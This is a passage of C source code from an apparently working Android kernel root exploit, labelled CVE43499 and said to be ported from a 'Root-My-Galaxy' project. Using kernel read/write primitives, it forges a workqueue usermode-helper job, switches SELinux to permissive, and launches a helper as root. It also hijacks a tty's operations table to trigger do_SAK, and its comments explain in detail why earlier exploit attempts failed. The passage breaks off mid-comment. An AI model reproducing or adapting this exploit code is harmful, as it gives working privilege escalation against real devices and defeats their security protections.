#include "common.h"

#include <stdlib.h>
#include <sys/un.h>

int root_child_done;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
#define ROOT_HOLD_READY_SOCKET "cve43499_roothold"

struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");

static int root_read_data(
    int fd, uintptr_t target, void *data, size_t len) {
  return pipe_phys_read_data(fd, target, data, len);
}

static int root_write_data(
    int fd, uintptr_t target, const void *data, size_t len) {
  return pipe_phys_write_data(fd, target, data, len);
}

static int root_read_global(
    int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len) == (ssize_t)len;
}

static int root_write_global(
    int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len) == (ssize_t)len;
}

static int root_read64(
    int fd, uintptr_t target, uint64_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_read32(
    int fd, uintptr_t target, uint32_t *value) {
  return value && root_read_data(fd, target, value, sizeof(*value));
}

static int root_write64(int fd, uintptr_t target, uint64_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write32(int fd, uintptr_t target, uint32_t value) {
  return root_write_data(fd, target, &value, sizeof(value));
}

static int root_write64_exact(int fd, uintptr_t target, uint64_t value) {
  uint64_t readback = 0;
  return root_write64(fd, target, value) &&
         root_read64(fd, target, &readback) && readback == value;
}

static int root_write32_exact(int fd, uintptr_t target, uint32_t value) {
  uint32_t readback = 0;
  return root_write32(fd, target, value) &&
         root_read32(fd, target, &readback) && readback == value;
}

static int root_restore64(
    int fd, uintptr_t target, uint64_t ours, uint64_t old) {
  uint64_t current = 0;
  if (!root_read64(fd, target, &current)) {
    return 0;
  }
  if (current == old) {
    return 1;
  }
  return current == ours && root_write64_exact(fd, target, old);
}

static int root_restore32(
    int fd, uintptr_t target, uint32_t ours, uint32_t old) {
  uint32_t current = 0;
  if (!root_read32(fd, target, &current)) {
    return 0;
  }
  if (current == old) {
    return 1;
  }
  return current == ours && root_write32_exact(fd, target, old);
}

static int root_all_zero(const void *data, size_t size) {
  const uint8_t *bytes = data;
  for (size_t i = 0; i < size; i++) {
    if (bytes[i]) {
      return 0;
    }
  }
  return 1;
}

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }

  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

/* Read the uid the root helper reported for itself. Returns 1 only when a well-formed
 * "uid=<n> euid=<n> ..." banner was parsed, and requires uid and euid to agree, so a stale
 * file from a previous run or a truncated write cannot be mistaken for proof of root. */
static int read_root_creds_uid(uint32_t *uid_out) {
  int fd = open(ROOT_CREDS_SENTINEL, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char buf[128];
  ssize_t got = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  buf[got] = '\0';
  unsigned uid = 0, euid = 0;
  if (sscanf(buf, "uid=%u euid=%u", &uid, &euid) != 2) {
    return 0;
  }
  if (uid != euid) {
    rmg_diag("ROOT creds uid/euid disagree uid=%u euid=%u\n", uid, euid);
    return 0;
  }
  *uid_out = uid;
  return 1;
}

/* True once the root helper's activation sequence has logged completion.
 *
 * The helper writes /data/local/tmp/ksu-activate.log as root and fchowns it to 2000:2000, so
 * the shell-domain payload can read it. This is the success signal that does NOT depend on
 * the daemon's unix socket, which is exactly the link that proved unreliable on device. */
static int root_activation_done(void) {
  static const char kDone[] = "[activate] done";
  int fd = open(ROOT_ACTIVATE_LOG_PATH, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char buf[4096];
  ssize_t got = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  buf[got] = '\0';
  return strstr(buf, kDone) != NULL;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    (!defined(APP_ROOT_REF_HOLDER_REQUIRED) || APP_ROOT_REF_HOLDER_REQUIRED)
static int root_hold_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  memcpy(address.sun_path + 1, ROOT_HOLD_READY_SOCKET,
         sizeof(ROOT_HOLD_READY_SOCKET) - 1);
  socklen_t address_length = (socklen_t)(
      offsetof(struct sockaddr_un, sun_path) +
      sizeof(ROOT_HOLD_READY_SOCKET));
  int ready = connect(fd, (struct sockaddr *)&address, address_length) == 0;
  close(fd);
  return ready;
}
#endif

static int install_workqueue_umh_root(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t permissive = 0;
  uint8_t selinux_old = 0;
  uint8_t selinux_readback = 0;
  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  uint8_t saved_work[sizeof(struct umh_subprocess_info)];
  uint8_t saved_data[sizeof(struct umh_kernel_data)];
  uint8_t scratch_readback[sizeof(struct umh_kernel_data)];
  int scratch_saved = 0;
  int selinux_changed = 0;
  int inflight_changed = 0;
  int active_changed = 0;
  int refcnt_changed = 0;
  int list_prev_changed = 0;
  int published = 0;
  uint32_t complete_done = 0;
  int socket_ok = 0;
  int result = 0;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));
  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    pr_error("root umh missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif
  rmg_diag("ROOT umh start helper=%s work=%016zx data=%016zx\n", root_umh_path,
           (uintptr_t)fake_work_addr, (uintptr_t)umh_data_addr);
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    pr_error("root umh helper path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
  uintptr_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);

  uintptr_t fake_work_end = fake_work_addr + sizeof(saved_work) - 1;
  uintptr_t umh_data_end = umh_data_addr + sizeof(saved_data) - 1;
  if (!is_direct_ptr(fake_work_addr) || !is_direct_ptr(umh_data_addr) ||
      fake_work_end < fake_work_addr || umh_data_end < umh_data_addr ||
      (fake_work_addr >> PAGE_SHIFT) != (fake_work_end >> PAGE_SHIFT) ||
      (umh_data_addr >> PAGE_SHIFT) != (umh_data_end >> PAGE_SHIFT) ||
      !(fake_work_end < umh_data_addr || umh_data_end < fake_work_addr)) {
    pr_error("root umh bad scratch spans work=%016zx-%016zx data=%016zx-%016zx\n",
             fake_work_addr, fake_work_end, umh_data_addr, umh_data_end);
    return 0;
  }
  rmg_diag("ROOT umh reading scratch work(%zu) data(%zu)\n", sizeof(saved_work),
           sizeof(saved_data));
  if (!root_read_data(fd, fake_work_addr, saved_work, sizeof(saved_work)) ||
      !root_read_data(fd, umh_data_addr, saved_data, sizeof(saved_data))) {
    pr_error("root umh scratch old read failed\n");
    rmg_diag("ROOT umh scratch read FAILED\n");
    return 0;
  }
  scratch_saved = 1;
  if (!root_all_zero(saved_work, sizeof(saved_work)) ||
      !root_all_zero(saved_data, sizeof(saved_data))) {
    pr_error("root umh scratch not zero work=%d data=%d\n",
             root_all_zero(saved_work, sizeof(saved_work)),
             root_all_zero(saved_data, sizeof(saved_data)));
    return 0;
  }
  int selinux_read = root_read_global(
      fd, selinux_addr, &selinux_old, sizeof(selinux_old));
  if (!selinux_read) {
    pr_error("root umh selinux read failed direct=%016zx virtual=%016zx\n",
             selinux_addr, text_addr(SELINUX_ENFORCING));
    return 0;
  }
  if (selinux_old > 1) {
    pr_error("root umh bad selinux old=%u\n", selinux_old);
    return 0;
  }
  pr_info("root umh spans work=%016zx-%016zx data=%016zx-%016zx selinux=%016zx old=%u\n",
          fake_work_addr, fake_work_end, umh_data_addr, umh_data_end,
          selinux_addr, selinux_old);

  unlink(ROOT_SOCKET_PATH);

  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
  uint64_t wq_value = 0;
  uint64_t pwq_value = 0;
  uint64_t pool_value = 0;
  uint64_t pwq_wq_value = 0;
  rmg_diag("ROOT umh scratch ok, reading wq slot=%016zx\n", wq_slot);
  if (!root_read_global(fd, wq_slot, &wq_value, sizeof(wq_value))) {
    pr_error("root umh workqueue slot read failed\n");
    rmg_diag("ROOT umh wq slot read FAILED\n");
    goto cleanup;
  }
  rmg_diag("ROOT umh wq=%016llx\n", (unsigned long long)wq_value);
  uintptr_t wq = (uintptr_t)wq_value;
  if (!is_direct_ptr(wq) ||
      !root_read64(fd, wq + WQ_DFL_PWQ_OFF, &pwq_value)) {
    pr_error("root umh pwq read failed wq=%016zx\n", wq);
    goto cleanup;
  }
  uintptr_t pwq = (uintptr_t)pwq_value;
  if (!is_direct_ptr(pwq) ||
      !root_read64(fd, pwq + PWQ_POOL_OFF, &pool_value) ||
      !root_read64(fd, pwq + PWQ_WQ_OFF, &pwq_wq_value)) {
    pr_error("root umh pool read failed pwq=%016zx\n", pwq);
    goto cleanup;
  }
  uintptr_t pool = (uintptr_t)pool_value;
  uintptr_t pwq_wq = (uintptr_t)pwq_wq_value;
  if (!is_direct_ptr(wq) || !is_direct_ptr(pwq) ||
      !is_direct_ptr(pool) || pwq_wq != wq) {
    pr_error("root umh bad workqueue wq_slot=%016zx wq=%016zx "
             "pwq=%016zx pool=%016zx pwq_wq=%016zx\n",
             wq_slot, wq, pwq, pool, pwq_wq);
    return 0;
  }

  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  /* The gate is "the list is empty", not "nr_idle > 0".
   *
   * nr_idle on system_unbound_wq's per-node unbound pool is 0 almost all the time on a live
   * phone, so requiring it made this the first silent dead end: 200 iterations x 1ms and 600
   * pipe operations spent proving the pool was busy, and then it bailed before ever
   * touching the worklist. The predicate that actually matters for a list insert is that
   * there is no in-flight work to interleave with. */
  for (int i = 0; i < 8; i++) {
    if (!root_read64(fd, worklist, &list_next) ||
        !root_read64(fd, worklist + sizeof(uint64_t), &list_prev)) {
      pr_error("root umh pool state read failed\n");
      goto cleanup;
    }
    if (list_next == worklist && list_prev == worklist) {
      break;
    }
    usleep(1000);
  }
  rmg_diag("ROOT umh pool=%016zx worklist=%016zx list=%016llx/%016llx\n", pool,
           worklist, (unsigned long long)list_next, (unsigned long long)list_prev);
  if (list_next != worklist || list_prev != worklist) {
    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
             "head=%016zx\n",
             pool, (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist);
    rmg_diag("ROOT umh pool BUSY (worklist not empty)\n");
    goto cleanup;
  }

  uint32_t color = 0;
  uint32_t refcnt = 0;
  uint32_t nr_active = 0;
  uint32_t max_active = 0;
  if (!root_read32(fd, pwq + PWQ_WORK_COLOR_OFF, &color) ||
      !root_read32(fd, pwq + PWQ_REFCNT_OFF, &refcnt) ||
      !root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active) ||
      !root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active)) {
    pr_error("root umh pwq state read failed\n");
    goto cleanup;
  }
  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
    pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
             color, refcnt, nr_active, max_active);
    goto cleanup;
  }

  uintptr_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = 0;
  if (!root_read32(fd, inflight_addr, &nr_inflight) ||
      nr_inflight == UINT32_MAX || nr_active == UINT32_MAX ||
      refcnt == UINT32_MAX) {
    pr_error("root umh bad counters inflight=%u active=%u refcnt=%u\n",
             nr_inflight, nr_active, refcnt);
    goto cleanup;
  }
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
         &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func,
         sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  int data_write = root_write_data(
      fd, umh_data_addr, &umh_data, sizeof(umh_data));
  int work_write = root_write_data(
      fd, fake_work_addr, &fake, sizeof(fake));
  if (!data_write || !work_write ||
      !root_read_data(fd, umh_data_addr, scratch_readback,
                      sizeof(umh_data)) ||
      memcmp(scratch_readback, &umh_data, sizeof(umh_data)) != 0 ||
      !root_read_data(fd, fake_work_addr, scratch_readback,
                      sizeof(fake)) ||
      memcmp(scratch_readback, &fake, sizeof(fake)) != 0) {
    pr_error("root umh scratch write/readback failed data=%d work=%d\n",
             data_write, work_write);
    goto cleanup;
  }

  if (selinux_old != permissive) {
    selinux_changed = 1;
    if (!root_write_global(fd, selinux_addr, &permissive,
                           sizeof(permissive)) ||
        !root_read_global(fd, selinux_addr, &selinux_readback,
                          sizeof(selinux_readback)) ||
        selinux_readback != permissive) {
      pr_error("root umh selinux write/readback failed now=%u\n",
               selinux_readback);
      goto cleanup;
    }
  }

  if (!root_read64(fd, worklist, &list_next) ||
      !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
      list_next != worklist || list_prev != worklist) {
    pr_error("root umh worklist changed before queue next=%016llx prev=%016llx\n",
             (unsigned long long)list_next,
             (unsigned long long)list_prev);
    goto cleanup;
  }

  inflight_changed = 1;
  int inflight_write = root_write32_exact(
      fd, inflight_addr, nr_inflight + 1);
  active_changed = 1;
  int active_write = inflight_write && root_write32_exact(
      fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1);
  refcnt_changed = 1;
  int refcnt_write = active_write && root_write32_exact(
      fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
  list_prev_changed = 1;
  int list_prev_write = refcnt_write && root_write64_exact(
      fd, worklist + sizeof(uint64_t), fake_entry);
  if (!list_prev_write ||
      !root_read64(fd, worklist, &list_next) || list_next != worklist) {
    pr_error("root umh prepublish write failed counters=%d/%d/%d prev=%d next=%016llx\n",
             inflight_write, active_write, refcnt_write, list_prev_write,
             (unsigned long long)list_next);
    goto cleanup;
  }

  int list_next_write = root_write64(fd, worklist, fake_entry);
  uint64_t published_next = 0;
  if (list_next_write ||
      (root_read64(fd, worklist, &published_next) &&
       published_next == fake_entry)) {
    published = 1;
  } else {
    pr_error("root umh publish failed ret=%d next=%016llx\n",
             list_next_write, (unsigned long long)published_next);
    goto cleanup;
  }
  rmg_diag("ROOT umh PUBLISHED wq=%016zx pwq=%016zx pool=%016zx work=%016zx "
           "entry=%016zx color=%u writes=%d/%d/%d/%d/%d/%d/%d\n",
           wq, pwq, pool, fake_work_addr, fake_entry, color,
           data_write, work_write, inflight_write, active_write, refcnt_write,
           list_prev_write, list_next_write);
  pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
          "writes=%d/%d/%d/%d/%d/%d/%d\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt, data_write, work_write,
          inflight_write, active_write, refcnt_write,
          list_prev_write, list_next_write);

  int wake_ok = 0;
  rmg_diag("ROOT umh waiting for completion at %016zx\n", completion_addr);
  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 25; j++) {
      /* The completion lives in OUR reclaimed page, so read it through the configfs AAR,
       * not the pipe. The pipe path costs 4 descriptor read-modify-writes per 4-byte poll
       * (2000 of them for a flag that only a real kworker can ever set), and every one of
       * those is a window on a live ring slot. */
      if (!root_read_global(fd, completion_addr, &complete_done,
                            sizeof(complete_done))) {
        pr_error("root umh completion read failed\n");
        goto cleanup;
      }
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  uint32_t retval_value = 0;
  if (complete_done &&
      !root_read32(fd,
                   fake_work_addr +
                       offsetof(struct umh_subprocess_info, retval),
                   &retval_value)) {
    pr_error("root umh retval read failed\n");
    goto cleanup;
  }
  int32_t umh_retval = (int32_t)retval_value;
  if (complete_done) {
    for (int i = 0; i < 200; i++) {
      if (root_socket_ready()) {
        socket_ok = 1;
        break;
      }
      usleep(10000);
    }
  }

  pr_info("root umh result wake=%d complete=%u retval=%d socket=%d\n",
          wake_ok, complete_done, umh_retval, socket_ok);
  result = socket_ok;

cleanup:
  if (!published) {
    int rollback_ok = 1;
    if (list_prev_changed) {
      rollback_ok &= root_restore64(
          fd, worklist + sizeof(uint64_t), fake_entry, list_prev);
    }
    if (refcnt_changed) {
      rollback_ok &= root_restore32(
          fd, pwq + PWQ_REFCNT_OFF, refcnt + 1, refcnt);
    }
    if (active_changed) {
      rollback_ok &= root_restore32(
          fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1, nr_active);
    }
    if (inflight_changed) {
      rollback_ok &= root_restore32(
          fd, inflight_addr, nr_inflight + 1, nr_inflight);
    }
    if (!rollback_ok) {
      pr_error("root umh prepublish rollback failed\n");
    }
  } else if (!complete_done) {
    pr_error("root umh published but incomplete; scratch retained\n");
  }

  if (scratch_saved && (!published || complete_done)) {
    int work_restore = root_write_data(
        fd, fake_work_addr, saved_work, sizeof(saved_work));
    int data_restore = root_write_data(
        fd, umh_data_addr, saved_data, sizeof(saved_data));
    int work_read = root_read_data(
        fd, fake_work_addr, scratch_readback, sizeof(saved_work));
    int work_match = work_read &&
                     memcmp(scratch_readback, saved_work,
                            sizeof(saved_work)) == 0;
    int data_read = root_read_data(
        fd, umh_data_addr, scratch_readback, sizeof(saved_data));
    int data_match = data_read &&
                     memcmp(scratch_readback, saved_data,
                            sizeof(saved_data)) == 0;
    pr_info("root umh scratch restore work=%d/%d data=%d/%d\n",
            work_restore, work_match, data_restore, data_match);
    if (!work_restore || !work_match || !data_restore || !data_match) {
      pr_error("root umh scratch restore failed\n");
    }
  }

  if (!result && selinux_changed && (!published || complete_done)) {
    uint8_t current = 0xff;
    int read_ok = root_read_global(fd, selinux_addr, &current,
                                   sizeof(current));
    int restore_ok = read_ok &&
        (current == selinux_old ||
         (current == permissive &&
          root_write_global(fd, selinux_addr, &selinux_old,
                            sizeof(selinux_old)) &&
          root_read_global(fd, selinux_addr, &current, sizeof(current)) &&
          current == selinux_old));
    pr_info("root umh selinux rollback=%d old=%u now=%u\n",
            restore_ok, selinux_old, current);
    if (!restore_ok) {
      pr_error("root umh selinux rollback failed\n");
    }
  } else if (!result && selinux_changed) {
    pr_error("root umh selinux retained while published work is incomplete\n");
  } else if (result) {
    pr_info("root umh selinux left=%u intended root state old=%u\n",
            permissive, selinux_old);
  }

  rmg_diag("ROOT umh done done=%d retval=%d socket_ok=%d wake=%d result=%d\n",
           complete_done, (int)umh_retval, socket_ok, wake_ok, result);
  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return result;
}

/* =====================================================================================
 * PTY / SAK root stage.
 *
 * This replaces the previous hand-rolled workqueue injection, which could NEVER have
 * worked: it hand-wrote pool->worklist links and bumped the pwq counters, but nothing
 * ever calls wake_up_worker(). On the queue path the only caller is insert_work()
 * (kernel/workqueue.c:1367-1370), so the forged work sat in the list forever and
 * completion.done never flipped. On-device it never even got past the pwq descent.
 *
 * The mechanism here lets the KERNEL do the queueing. We borrow a real, permanently
 * kernel-owned work_struct at tty->SAK_work, rewrite the subprocess_info tail that lives
 * inside it, repoint tty->ops at a copy of the real tty_operations whose flush_buffer is
 * do_SAK, and then issue one genuine ioctl(TCFLSH). tty_driver_flush_buffer() calls our
 * do_SAK, which does schedule_work(&tty->SAK_work) - and from there the real workqueue
 * machinery does the locking, colour assignment, accounting and wake that we could not
 * fake. A real kworker then runs call_usermodehelper_exec_work.
 *
 * Ported from soumarcelino/Root-My-Galaxy-SM-S918B @ 6f30501b,
 * targets/zzhl/brazilian-open-payload-engine/src/10_workqueue_umh_root.c
 * ===================================================================================== */

struct private_pty {
  int master;
  int slave;
  char slave_name[128];
};

struct tty_kernel_object {
  uint64_t file;
  uint64_t private_data;
  uint64_t tty;
  uint64_t original_ops;
  uint8_t original_tail[UMH_SUBPROCESS_INFO_SIZE];
  uint8_t original_ops_table[TTY_OPS_SIZE];
};

_Static_assert(sizeof(struct tty_kernel_object) > 0, "tty object");

/* Staging area for the forged tty_operations, in our own reclaimed page. Must not collide
 * with ROOT_UMH_DATA_OFF (0x6200) or the proof band (+0x800); 0x6400 is clear. */
#define ROOT_TTY_OPS_LIVE_OFF 0x6400ULL

static uint64_t load_u64(const void *buffer, size_t offset) {
  uint64_t value = 0;
  memcpy(&value, (const uint8_t *)buffer + offset, sizeof(value));
  return value;
}

static void store_u64(void *buffer, size_t offset, uint64_t value) {
  memcpy((uint8_t *)buffer + offset, &value, sizeof(value));
}

static int open_private_pty(struct private_pty *pty) {
  memset(pty, 0, sizeof(*pty));
  pty->master = -1;
  pty->slave = -1;
  pty->master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (pty->master < 0 || grantpt(pty->master) != 0 ||
      unlockpt(pty->master) != 0 ||
      ptsname_r(pty->master, pty->slave_name, sizeof(pty->slave_name)) != 0) {
    return 0;
  }
  pty->slave = open(pty->slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  return pty->slave >= 0;
}

static void close_private_pty(struct private_pty *pty) {
  if (pty->slave >= 0) {
    close(pty->slave);
  }
  if (pty->master >= 0) {
    close(pty->master);
  }
  pty->slave = -1;
  pty->master = -1;
}

/* True when a read-back tty_operations looks like a real driver's table.
 *
 * The direct map is fully mapped, so a mis-targeted alias read returns SUCCESSFULLY with
 * errno 0 and either zeros or unrelated bytes. Publishing that as a live tty's ops is how the
 * first ioctl jumps to address 0, so this predicate is the only thing standing between a bad
 * alias and a wild indirect call.
 *
 * Slots checked, against drivers/tty/pty.c pty_unix98_ops (all four ARE set there):
 *   lookup 0x00, open 0x18, write 0x38, flush_buffer 0xa8.
 * ioctl 0x60 is deliberately NOT checked - pty_unix98_ops leaves .ioctl/.compat_ioctl NULL,
 * and requiring text there rejected a perfectly good table. Offsets come from this device's
 * own BTF; struct tty_operations is __randomize_layout, so the source header order is not
 * authoritative. */
static int tty_ops_table_is_plausible(const uint8_t *table, uintptr_t port) {
  const uintptr_t text_lo = kaslr_base;
  const uintptr_t text_hi = kaslr_base + 0x04000000ULL;
  const uintptr_t in_text = text_lo | (text_hi - 1);
  const uint64_t lookup = load_u64(table, TTY_OPS_LOOKUP_OFF);
  const uint64_t open = load_u64(table, TTY_OPS_OPEN_OFF);
  const uint64_t writef = load_u64(table, TTY_OPS_WRITE_OFF);
  const uint64_t flush = load_u64(table, TTY_OPS_FLUSH_BUFFER_OFF);
  const uint64_t ioctl = load_u64(table, TTY_OPS_IOCTL_OFF);
  rmg_diag("ROOT pty ops table lookup=%016llx open=%016llx write=%016llx ioctl=%016llx "
           "flush=%016llx text=[%016zx,%016zx) port=%016zx\n",
           (unsigned long long)lookup, (unsigned long long)open,
           (unsigned long long)writef, (unsigned long long)ioctl,
           (unsigned long long)flush, text_lo, text_hi, port);
  (void)in_text;
  return (uintptr_t)lookup >= text_lo && (uintptr_t)lookup < text_hi &&
         (uintptr_t)open >= text_lo && (uintptr_t)open < text_hi &&
         (uintptr_t)writef >= text_lo && (uintptr_t)writef < text_hi &&
         (uintptr_t)flush >= text_lo && (uintptr_t)flush < text_hi;
}

/* Reuse the task_struct the walk already resolved rather than walking the list again. */
static int resolve_tty_object(int fd, int tty_fd, struct tty_kernel_object *object) {
  memset(object, 0, sizeof(*object));
  uintptr_t task = pipe_walk_self_task;
  uintptr_t files = pipe_walk_self_files;
  if (!task || !files || !is_direct_ptr(task) || !is_direct_ptr(files)) {
    rmg_diag("ROOT pty no walked self task task=%016zx files=%016zx\n", task, files);
    return 0;
  }
  uintptr_t fdt = 0;
  uint64_t fd_array = 0;
  uint32_t max_fds = 0;
  if (!pipe_phys_read64(fd, files + PIPE_WALK_FILES_FDT_OFF, (uint64_t *)&fdt) ||
      !is_direct_ptr(fdt) ||
      !pipe_phys_read32(fd, fdt + PIPE_WALK_FDTABLE_MAX_FDS, &max_fds) ||
      tty_fd < 0 || (uint32_t)tty_fd >= max_fds ||
      !pipe_phys_read64(fd, fdt + PIPE_WALK_FDTABLE_FD_OFF, &fd_array) ||
      !is_direct_ptr(fd_array) ||
      !pipe_phys_read64(fd, fd_array + (uint64_t)tty_fd * sizeof(uint64_t),
                        &object->file) ||
      !is_direct_ptr(object->file) ||
      !pipe_phys_read64(fd, object->file + PIPE_WALK_FILE_PRIVATE_OFF,
                        &object->private_data) ||
      !is_direct_ptr(object->private_data) ||
      !pipe_phys_read64(fd, object->private_data + TTY_FILE_TTY_OFF, &object->tty) ||
      !is_direct_ptr(object->tty)) {
    rmg_diag("ROOT pty fd->file->private_data->tty walk failed fd=%d\n", tty_fd);
    return 0;
  }

  uint64_t private_file = 0;
  uint64_t port = 0;
  uint32_t magic = 0, index = 0;
  if (!pipe_phys_read64(fd, object->private_data + TTY_FILE_FILE_OFF, &private_file) ||
      private_file != object->file ||
      !pipe_phys_read32(fd, object->tty + TTY_MAGIC_OFF, &magic) ||
      magic != TTY_MAGIC ||
      !pipe_phys_read32(fd, object->tty + TTY_INDEX_OFF, &index) || index > 4095 ||
      !pipe_phys_read64(fd, object->tty + TTY_OPS_OFF, &object->original_ops) ||
      !pipe_phys_read64(fd, object->tty + TTY_PORT_OFF, &port) ||
      !is_direct_ptr(port)) {
    rmg_diag("ROOT pty tty validation failed magic=%#x index=%u ops=%016llx\n", magic,
             index, (unsigned long long)object->original_ops);
    return 0;
  }

  /* tty->ops is a kernel-IMAGE address (a static const in drivers/tty/pty.c), but we do NOT
   * need a direct-map alias to read it.
   *
   * configfs_read_once() hands the driver a VIRTUAL address: it sets
   * `page = target - (ASHMEM_PREFIX_COUNT - len)` and the driver copies from
   * `page + ki_pos`, which equals `target` by construction (util.c:3218-3220). There is no
   * direct_to_page() translation on this path, so the AAR addresses arbitrary kernel virtual
   * addresses directly. That is already load-bearing elsewhere in this file's own walk:
   * pipe_walk_resolve_tasks_head() reads init_task at 0xffffffc0... through
   * walk_read_fields() -> configfs_read_once() and it works, with the guard deliberately not
   * armed ("GUARD n/a object=... kernel-image") because an image page has no slab_cache.
   *
   * The P0 alias machinery this replaced was pure guesswork. kernel_image_alias() had three
   * candidate modes and ALL THREE read implausible data on device: mode 0 gave all zeros, and
   * mode +1 gave small integers (open=0x34, flush=0x204) - a different structure entirely,
   * not a mis-targeted tty_operations. So slide_p0_offset is not the problem to solve here;
